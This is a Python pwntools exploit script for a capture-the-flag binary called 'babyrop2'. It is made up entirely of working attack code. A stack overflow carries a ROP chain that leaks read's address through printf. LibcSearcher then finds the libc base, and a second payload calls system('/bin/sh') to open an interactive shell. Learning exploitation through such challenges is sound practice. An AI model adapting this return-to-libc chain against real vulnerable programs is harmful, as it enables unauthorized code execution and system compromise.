# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

p = process('babyrop2')
elf = ELF('babyrop2')

padding = 'a' * 0x20
fake_ebp = 'klose2jo'
ret_addr = 0x0400734
pop_rdi_ret = 0x0400733
pop_rsi_r15_ret = 0x0400731
format_addr = 0x0400770

read_got = elf.got['read']
printf_plt = elf.plt['printf']
main_addr = elf.symbols['main']

payload1 = padding + fake_ebp + p64(pop_rdi_ret) + p64(format_addr) + p64(pop_rsi_r15_ret)
payload1 += p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)

p.recvuntil('name?')
p.sendline(payload1)

read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print('read_addr: ', hex(read_addr))
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')

system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')

payload2 = padding + fake_ebp + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload2)

p.interactive()


